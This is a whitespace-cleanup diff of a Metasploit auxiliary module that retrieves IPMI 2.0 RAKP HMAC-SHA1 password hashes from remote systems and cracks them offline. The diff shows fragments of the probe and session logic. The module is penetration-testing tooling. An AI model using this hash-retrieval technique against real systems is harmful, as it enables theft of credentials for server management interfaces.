@@ -18,14 +18,14 @@ class Metasploit3 < Msf::Auxiliary
 		super(
 			'Name'        => 'IPMI 2.0 RAKP Remote SHA1 Password Hash Retreival',
 			'Description' => %q|
-				This module identifies IPMI 2.0 compatible systems and attempts to retrieve the 
-				HMAC-SHA1 password hashes of default usernames. The hashes can be stored in a 
+				This module identifies IPMI 2.0 compatible systems and attempts to retrieve the
+				HMAC-SHA1 password hashes of default usernames. The hashes can be stored in a
 				file using the OUTPUT_FILE option and then cracked using hmac_sha1_crack.rb
 				in the tools subdirectory as well hashcat (cpu) 0.46 or newer using type 7300.
 				|,
 			'Author'      => [ 'Dan Farmer <zen[at]fish2.com>', 'hdm' ],
 			'License'     => MSF_LICENSE,
-			'References'  => 
+			'References'  =>
 				[
 					['URL', 'http://fish2.com/ipmi/remote-pw-cracking.html']
 				],
@@ -40,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
 			]),
 			OptPath.new('PASS_FILE', [ true, "File containing common passwords for offline cracking, one per line",
 				File.join(Msf::Config.install_root, 'data', 'wordlists', 'ipmi_passwords.txt')
-			]),			
+			]),
 			OptString.new('OUTPUT_HASHCAT_FILE', [false, "Save captured password hashes in hashcat format"]),
 			OptString.new('OUTPUT_JOHN_FILE', [false, "Save captured password hashes in john the ripper format"]),
 			OptBool.new('CRACK_COMMON', [true, "Automatically crack common passwords as they are obtained", true])
@@ -61,7 +61,7 @@ class Metasploit3 < Msf::Auxiliary
 			vprint_status("#{rhost} No response to IPMI probe")
 			return
 		end
-		
+
 		info = process_getchannel_reply(*r)
 		unless info
 			vprint_status("#{rhost} Could not understand the response to the IPMI probe")
@@ -97,14 +97,14 @@ class Metasploit3 < Msf::Auxiliary
 
 				unless r
 					vprint_status("#{rhost} No response to IPMI open session request")
-					rakp = nil 
+					rakp = nil
 					break
 				end
-				
+
 				sess = process_opensession_reply(*r)
 				unless sess
 					vprint_status("#{rhost} Could not understand the response to the open session request")
-					rakp = nil 
+					rakp = nil
 					break
 				end
 
@@ -119,11 +119,11 @@ class Metasploit3 < Msf::Auxiliary
 					vprint_status("#{rhost} No response to RAKP1 message")
 					next
 				end
-				
+
 				rakp = process_rakp1_reply(*r)
 				unless rakp
 					vprint_status("#{rhost} Could not understand the response to the RAKP1 request")
-					rakp = nil 
+					rakp = nil
 					break
 				end
 
@@ -136,14 +136,14 @@ class Metasploit3 < Msf::Auxiliary
 
 				if rakp.error_code != 0
 					vprint_error("#{rhost} Returned error code #{rakp.error_code} for username #{username}: #{Rex::Proto::IPMI::RMCP_ERRORS[rakp.error_code].to_s}")
-					rakp = nil 
+					rakp = nil
 					break
 				end
 
 				# TODO: Finish documenting this error field
 				if rakp.ignored1 != 0
 					vprint_error("#{rhost} Returned error code #{rakp.ignored1} for username #{username}")
-					rakp = nil 
+					rakp = nil
 					break
 				end
 
@@ -312,6 +312,6 @@ class Metasploit3 < Msf::Auxiliary
 
 	def rport
 		datastore['RPORT']
-	end	
+	end
 
 end
